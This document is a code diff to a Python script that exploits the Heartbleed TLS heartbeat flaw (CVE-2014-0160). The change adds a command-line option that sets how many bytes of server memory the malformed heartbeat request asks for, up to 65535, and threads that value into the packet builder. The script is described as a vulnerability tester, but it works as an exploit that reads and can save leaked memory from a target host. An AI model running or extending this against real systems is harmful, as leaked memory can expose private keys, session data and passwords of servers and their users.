@@ -16,19 +16,27 @@ def info(msg):
 
 def error(msg):
     print '[-] {}'.format(msg)
-    sys.exit(0)
+    sys.exit(1)
 
 def debug(msg):
     if opts.debug: print '[*] {}'.format(msg)
 
 def parse_cl():
     global opts
+
+    def valid_size(s):
+        value = int(s)
+        if value < 0 or value > 65535:
+            raise argparse.ArgumentTypeError("length must be within 0..65535, is %d" % value)
+        return value
+
     parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
     parser.add_argument('host', help='IP or hostname of target system')
     parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')
     parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')
     parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default=False, help='Check STARTTLS')
     parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debug output')
+    parser.add_argument('-l', '--length', metavar='Length', type=valid_size, default=16384, help='Length of requested heartbeat memory (0-65535, default 16384')
     opts = parser.parse_args()
 
 def hex2bin(arr):
@@ -85,14 +93,14 @@ def build_client_hello(tls_ver):
     ]
     return client_hello
 
-def build_heartbeat(tls_ver):
+def build_heartbeat(tls_ver, length):
     heartbeat = [
 0x18,       # Content Type (Heartbeat)
 0x03, tls_ver,  # TLS version
 0x00, 0x03,  # Length
 # Payload
 0x01,       # Type (Request)
-0x50, 0x00  # Payload length
+length / 256, length % 256  # Payload length
     ] 
     return heartbeat
 
@@ -179,7 +187,7 @@ if __name__ == '__main__':
         error('No TLS version is supported')
 
     info('Sending heartbeat request...')
-    s.send(hex2bin(build_heartbeat(supported)))
+    s.send(hex2bin(build_heartbeat(supported, opts.length)))
 
     while True:
         typ,ver,message = rcv_tls_record(s)
